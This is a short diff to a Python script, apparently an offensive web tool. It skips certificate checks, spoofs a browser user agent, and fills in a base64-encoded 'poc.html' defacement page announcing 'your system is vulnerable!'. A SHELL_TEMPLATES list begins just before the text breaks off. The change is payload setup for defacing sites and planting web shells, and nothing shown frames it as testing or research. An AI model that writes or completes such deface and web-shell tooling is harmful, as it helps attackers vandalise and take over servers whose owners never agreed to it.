@@ -12,8 +12,19 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-POC_FILENAME = "nome_do.html"
-POC_CONTENT = """seu_html_aqui"""
+POC_FILENAME = "poc.html"
+POC_CONTENT = """<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Seu deface</title>
+</head>
+<body>
+  <h1>sys</h1>
+  <p>your system is vulnerable!</p>
+</body>
+</html>
+"""
 POC_B64 = base64.b64encode(POC_CONTENT.encode()).decode()
 
 SHELL_TEMPLATES = [
